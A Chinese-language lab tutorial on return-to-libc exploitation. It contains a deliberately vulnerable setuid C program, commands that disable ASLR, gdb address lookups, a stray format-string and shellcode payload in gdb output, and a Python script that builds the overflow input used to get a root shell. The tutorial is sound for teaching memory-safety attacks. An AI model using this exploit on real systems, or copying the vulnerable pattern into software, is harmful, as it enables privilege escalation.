#
#### 概述
为了抵御函数返回时跳转到恶意代码在栈中的位置执行，操作系统将程序的栈标记为不可执行。因此攻击者就无法在运行注入的代码，只能想办法借助内存中已有的代码进行攻击。  

内存中有一个区域存放着很多代码，主要时标准C语言库函数。在linux中被称为libc，它是一个动态链接库。这些libc库会在函数运行前加载到内存中。  

在libc库中最容易被利用的就是system()函数，如果想要在缓冲区溢出后运行一个shell，无须自己编写shellcode，只需要跳转到system，让他来运行`/bin/sh`即可。  


#### 漏洞代码
还是和缓冲区溢出攻击中的漏洞代码一样，只是编译是打开了不可执行栈的保护
```
// stack.c
# include <string.h>
# include <stdio.h>

int foo(char *str)
{
    char buffer[100];
    strcpy(buffer, str);
    return 1;
}

int main(int argc, char const *argv[])
{
    char str[400];
    FILE *badfile;
    
    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 300, badfile);
    foo(str);

    printf("it's ok!");
    return 0;
}
```
```
sudo sysctl -w kernel.randomize_va_space=0
gcc -o stack -g -fno-stack-protector stack.c 
sudo chown root stack
sudo chmod 4755 stack
```

#### 函数的序言和后记
**序言**  
![](/software-security/img/return-to-libc-2.png)
序言通常包含三条指令  
```
pushl %ebp //保存ebp的值(它目前指向调用者的帧栈)  
movl %esp, %ebp  //让ebp指向被调用者的帧栈
subl $N, %esp //为局部变量预留空间
```
a.当一个函数被调用时，返回地址(在函数调用前，计算机把新函数调用前的下一条指令的地址)被call指令压力栈中。因此在函数执行序言之前，栈指针esp是指向了返回地址  
b.将调用者的帧指针(称为前帧指针)存入栈中。当函数返回时，调用者的帧指针可以被恢复  
c.把esp赋值给ebp当作当前函数的栈底  
b.栈指针esp移动N个字节为函数的局部变量预留时间  


**后记**  
![](/software-security/img/return-to-libc-3.png)
```
movl %ebp, %esp  //释放为局部变量开辟的栈空间
popl %ebp  //让ebp指回调用者函数的帧栈
ret // 返回
```
b.把esp移动到帧指针指向的位置，即释放了序言时为局部变量开辟的栈空间  
c.把前帧指针重新赋值给ebp，恢复调用者函数的帧指针  
d.ret冲栈中弹出返回地址并跳转到该地址。  

#### 发起攻击
为了通过system运行`/bin/sh`需要完成三个步骤  

**1.找到system函数的地址，把漏洞程序中函数的返回地址改成该地址**
```
ubuntu@VM-0-17-ubuntu:~$ gdb -q stack
Reading symbols from stack...done.
(gdb) p system
No symbol "system" in current context.
(gdb) run
Starting program: /home/ubuntu/stack 

Program received signal SIGSEGV, Segmentation fault.
0xbffff4ac in ?? ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e54db0 <__libc_system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7e489e0 <__GI_exit>
```
在关闭了地址随机化的情况下，对同一个程序，这个函数库总是被加载到相同的内存地址。  
在gdb中需要run指令来执行目标程序，不然libc函数不会被加载到内存中。  
需要注意的是特权程序和非特权程序打印的地址可能是不一样的，所有可以先把漏洞程序改为特权程序在答应system函数地址。  


**2.找到字符串/bin/sh的地址，为了让system执行一个命令，命令的名字需要预先放在内存中。**  
有多种方式可以拿到字符串的地址。例如，可以在溢出攻击的时候，把字符串放入内存中。  
还有一种更简单的方式是通过环境变量，在运行漏洞程序之前，定义一个环境变量SHANSHELL="/bin/sh",并用export导出，该变量就会传递给子进程出现在漏洞程序内存中。
```
ubuntu@VM-0-17-ubuntu:~$ SHANSHELL="/bin/sh"
ubuntu@VM-0-17-ubuntu:~$ export SHANSHELL
ubuntu@VM-0-17-ubuntu:~$ gdb -q stack
Reading symbols from stack...done.
(gdb) b main
Breakpoint 1 at 0x80484ee: file stack.c, line 16.
(gdb) run
Starting program: /home/ubuntu/stack 

Breakpoint 1, main (argc=1, argv=0xbffff6a4) at stack.c:16
16	    badfile = fopen("badfile", "r");
(gdb) x/100s *((char **)environ)   # x/100s查看接下来的 100 个字符串
...
0xbfffffc1:	"HISTTIMEFORMAT=%F %T "
0xbfffffd7:	"SHANSHELL=/bin/sh"
0xbfffffe9:	"/home/ubuntu/stack" 
...

```
`0xbfffffe9:	"/home/ubuntu/stack"`在环境变量入栈前，程序的文件名会先被压入栈，因此程序名的长度会影响环境变量的地址  

因为知道了程序的名字会影响环境变量的地址，所以下面答应地址的程序env33保持和stack的长度一直都是5个字母长度  

```
// env33.c 
#include <stdio.h>
#include <stdlib.h>

int main()
{
    char *shell = (char *)getenv("SHANSHELL");
    if (shell)
    {
        printf(" Value: %s \n", shell);
        printf(" Address: %x\n", (unsigned int)shell);
    }
    return 1;
}
```

```
ubuntu@VM-0-17-ubuntu:~$ gcc -o env33 env33.c 
ubuntu@VM-0-17-ubuntu:~$ .env33
.env33: command not found
ubuntu@VM-0-17-ubuntu:~$ ./env33
 Value: /bin/sh 
 Address: bfffffcc
```
参数`/bin/sh`的地址为：0xbfffffcc  



**3.system函数的参数**  
由于system并不是常规的方式被调用的,漏洞程序只是跳转到system函数的入口，因此函数所需的参数不在栈中。所以需要自行将参数放入栈中。

![](/software-security/img/return-to-libc-1.png)

首先需要知道进入system函数后ebp的确切位置。通过ebp知道了返回地址是 ebp+4， 参数是 ebp+8 ,所以需要把字符串/bin/sh的地址放到比ebp高8字节的位置。 那么system函数后ebp是多少呢？


![](/software-security/img/return-to-libc-4.png)


![](/software-security/img/buffer2.png)


通过上图可以知道，一旦跳转到system()函数，函数序言执行，esp下移4个字节，ebp被设置为esp的当前值。通过函数的内存布局可以知道，ebp+4的地方是返回地址(可以在返回地址上放入exit()函数完美终止程序)，ebp+8就是参数的地址。所以现在只需要通过esp来计算出参数的地址  



**4.通过gdb调试出上面图(a)中ebp到buffer的距离**  
```
ubuntu@VM-0-17-ubuntu:~$ gdb -q stack
Reading symbols from stack...done.
(gdb) b foo
Breakpoint 1 at 0x80484c1: file stack.c, line 7.
(gdb) run
Starting program: /home/ubuntu/stack 

Breakpoint 1, foo (
    str=0xbffff47c "^\365\377\277@@@@\\\365\377\277%.49139x%17$hn%.13829x%19$hn", '\220' <repeats 128 times>, "\061\300\061۰\325̀1\300Ph//shh/bin\211\343PS\211ᙰ\v̀") at stack.c:7
7	    strcpy(buffer, str);
(gdb) p $ebp
$1 = (void *) 0xbffff458
(gdb) p &buffer
$2 = (char (*)[100]) 0xbffff3ec
(gdb) p/d 0xbffff458 - 0xbffff3ec
$3 = 108
```
ebp到foo函数中buffer的距离是108字节。因此计算如下：  
foo函数的返回地址system()函数的地址是 108 + 4  
system()函数的返回地址exit()函数的地址是 108 + 4 + 4 (通过上面图片看出整个过程后，system()函数的ebp比foo()函数的ebp高了4个字节，所以多+4)  
system参数/bin/sh的地址是 108 + 4 + 8  



#### 构建输入
libc_exploit.py
```
# 给content填上非零值
content = bytearray(0xaa for i in range(300))

a3 = 0xbfffffd7     # /bin/sh的地址
content[120:124] = (a3).to_bytes(4, byteorder='little')

a2 = 0xb7e489e0     # exit函数地址
content[116:120] = (a2).to_bytes(4, byteorder='little')

a1 = 0xb7e54db0     # system函数地址
content[112:116] = (a1).to_bytes(4, byteorder='little')

file = open("badfile", "wb")
file.write(content)
file.close()
```

#### 发起攻击
```
ubuntu@VM-0-17-ubuntu:~$ ./stack
$ id
uid=500(ubuntu) gid=500(ubuntu) groups=500(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare)
```
攻击成功，进入sh，但是不是root权限。  
这是因为ubuntu16.04中/bin/sh实际是一个指向/bin/dash的，它实现了一个保护机制，所以可以使用安装zsh代替/bin/sh试验  
```
ubuntu@VM-0-17-ubuntu:~$ sudo ln -s /bin/zsh /bin/sh                     
ln: failed to create symbolic link '/bin/sh': File exists
ubuntu@VM-0-17-ubuntu:~$ sudo rm /bin/sh
ubuntu@VM-0-17-ubuntu:~$ sudo ln -s /bin/zsh /bin/sh
ubuntu@VM-0-17-ubuntu:~$ ./stack                    
# id
uid=500(ubuntu) gid=500(ubuntu) euid=0(root) groups=500(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare)

```

